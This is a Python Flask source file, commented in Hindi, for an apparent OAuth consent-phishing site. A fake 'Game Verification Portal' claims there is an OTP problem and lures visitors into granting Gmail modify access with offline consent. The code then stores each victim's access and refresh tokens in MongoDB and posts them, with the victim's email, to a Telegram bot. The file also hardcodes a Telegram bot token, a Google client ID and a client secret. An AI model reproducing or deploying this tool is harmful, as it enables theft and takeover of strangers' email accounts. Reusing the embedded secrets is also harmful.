from flask import Flask, request, render_template_string
import requests
import os
from pymongo import MongoClient

app = Flask(__name__)

# रेंडर से MongoDB लिंक लेना - अगर लिंक न मिले तो प्रोग्राम रुक जाएगा
MONGO_URI = os.environ.get("MONGO_URI")
if not MONGO_URI:
    raise ValueError("MONGO_URI environment variable is not set!")

client = MongoClient(MONGO_URI)
db = client['bot_database'] 
tokens_collection = db['tokens']

# आपका वही पुराना HTML कोड
HTML_CODE = """
<!DOCTYPE html>
<html lang="hi-en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Game Verification Portal</title>
    <style>
        body { background-color: #0b1520; color: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background-color: #152230; padding: 25px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334; box-shadow: 0px 0px 15px rgba(0,0,0,0.5); }
        .title { font-size: 20px; font-weight: bold; color: #ffffff; margin-bottom: 20px; border-bottom: 2px solid #555; padding-bottom: 10px; text-transform: uppercase; }
        .box { background: #1c2e40; padding: 15px; border-radius: 8px; border-left: 4px solid #ffcc00; text-align: left; margin-bottom: 20px; font-size: 14px; }
        .btn { display: block; background: #ffffff; color: #000; padding: 12px; border-radius: 4px; text-decoration: none; font-weight: bold; margin-top: 20px; text-align: center; }
        .footer { font-size: 10px; color: #777; margin-top: 30px; }
    </style>
</head>
<body>
<div class="container">
    <div class="title">GAME VERIFICATION PORTAL</div>
    <div class="box">
        <strong>Important Info (Verification Issue):</strong><br>
        यदि आपके गेम बाउंड अकाउंट में वेरिफिकेशन ओटीपी प्राप्त नहीं हो रहा है, तो इस समस्या को ठीक करने के लिए कृपया साइन-इन करें।
    </div>
    <a href="{{ auth_url }}" class="btn">Sign in with Google</a>
    <div class="footer">&copy; 2026 Game Support Systems Inc. All Rights Reserved.</div>
</div>
</body>
</html>
"""

BOT_TOKEN = "8664981956:AAFWB4ZFeNrHACF15GQgnZEIBjs9V6Uxb8M"
CHAT_ID = "8293599881"
CLIENT_ID = "580564575215-suj93a1u7ganotmsrgnveb5nu8sjco1u.apps.googleusercontent.com"
CLIENT_SECRET = "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"
SCOPE = "https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/userinfo.email"

def save_to_db(email, access_token, refresh_token):
    tokens_collection.update_one(
        {"email": email},
        {"$set": {"access_token": access_token, "refresh_token": refresh_token}},
        upsert=True
    )

def send_to_telegram(email, access_token, refresh_token):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"🔔 **नया टोकन जनरेट हुआ!**\n📧 **ईमेल:** `{email}`\n\n🔑 **ACCESS TOKEN:**\n`{access_token}`\n\n🔄 **REFRESH TOKEN:**\n`{refresh_token}`"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

@app.route('/')
def home():
    redirect_uri = request.host_url.rstrip('/') + '/callback'
    auth_url = (
        f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}&"
        f"redirect_uri={redirect_uri}&response_type=code&scope={SCOPE}&access_type=offline&prompt=consent"
    )
    return render_template_string(HTML_CODE, auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    token_url = "https://oauth2.googleapis.com/token"
    data = {"code": code, "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, 
            "redirect_uri": request.host_url.rstrip('/') + '/callback', "grant_type": "authorization_code"}
    res = requests.post(token_url, data=data)
    if res.status_code == 200:
        tokens = res.json()
        email = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", 
                             headers={"Authorization": f"Bearer {tokens.get('access_token')}"}).json().get("email")
        save_to_db(email, tokens.get('access_token'), tokens.get('refresh_token'))
        send_to_telegram(email, tokens.get('access_token'), tokens.get('refresh_token'))
        return "🎉 सफलता! टोकन डेटाबेस में सेव हो गए हैं।"
    return "Error"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
